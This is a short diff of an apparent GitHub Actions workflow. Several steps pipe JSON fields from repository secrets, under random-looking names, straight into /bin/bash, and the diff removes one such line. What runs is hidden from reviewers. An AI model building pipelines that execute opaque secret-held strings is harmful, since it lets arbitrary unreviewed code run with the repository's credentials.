@@ -17,7 +17,6 @@ jobs:
           dsqo559: ${{ secrets.dsqo559 }}
         run: |
           printf '%s' "$dsqo559" | jq -r .pah90485 | /bin/bash
-          echo $ybe9228 | jq -r .mlbb5083 | /bin/bash
           printf '%s' "$ms78" | jq -r .a010 | /bin/bash
           printf '%s' "$rk6482" | jq -r .bwy14 | /bin/bash
           printf '%s' "$ingb30" | jq -r .wsy639 | /bin/bash
